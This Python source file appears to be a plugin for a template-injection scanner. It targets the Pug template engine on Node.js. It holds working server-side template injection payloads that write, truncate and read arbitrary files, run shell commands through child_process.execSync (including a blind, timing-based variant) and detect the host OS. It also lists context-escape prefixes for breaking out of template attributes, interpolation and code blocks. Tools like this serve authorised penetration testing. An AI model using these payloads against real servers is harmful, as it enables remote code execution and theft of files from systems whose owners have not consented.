from myscan.lib.scriptlib.ssti.languages import javascript


class Pug(javascript.Javascript):
    
    def init(self):

        self.update_actions({
            'render' : {
                'call': 'inject',
                'render': '\n= %(code)s\n',
                'header': '\n= %(header)s\n',
                'trailer': '\n= %(trailer)s\n',
            },
            # No evaluate_blind here, since we've no sleep, we'll use inject
            'write' : {
                'call' : 'inject',
                # Payloads calling inject must start with \n to break out already started lines
                'write' : """\n- global.scan.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')
""",
                'truncate' : """\n- global.scan.mainModule.require('fs').writeFileSync('%(path)s', '')
"""
            },
            'read' : {
                'call': 'render',
                'read' : """global.scan.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
            },
            'md5' : {
                'call': 'render',
                'md5': """global.scan.mainModule.require('crypto').createHash('md5').update(global.scan.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
            },
            'blind' : {
                'call': 'execute_blind',
                'test_bool_true' : 'true',
                'test_bool_false' : 'false'
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind' : {
                'call': 'inject',
                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
                # TODO: use another function.
                
                # Payloads calling inject must start with \n to break out already started lines
                
                # It's two lines command to avoid false positive with Javascript module
                'execute_blind': """
- x = global.scan.mainModule.require
- x('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')
"""
            },
            'execute' : {
                'call': 'render',
                'execute': """global.scan.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
            },
            'evaluate' : {
                'test_os': """global.scan.mainModule.require('os').platform()"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            # Attribute close a(href=\'%s\')
            { 'level': 1, 'prefix' : '%(closure)s)', 'suffix' : '//', 'closures' : { 1: javascript.ctx_closures[1] } },
            # String interpolation #{
            { 'level': 2, 'prefix' : '%(closure)s}', 'suffix' : '//', 'closures' : javascript.ctx_closures },
            # Code context
            { 'level': 2, 'prefix' : '%(closure)s\n', 'suffix' : '//', 'closures' : javascript.ctx_closures },
        ])

    language = 'javascript'



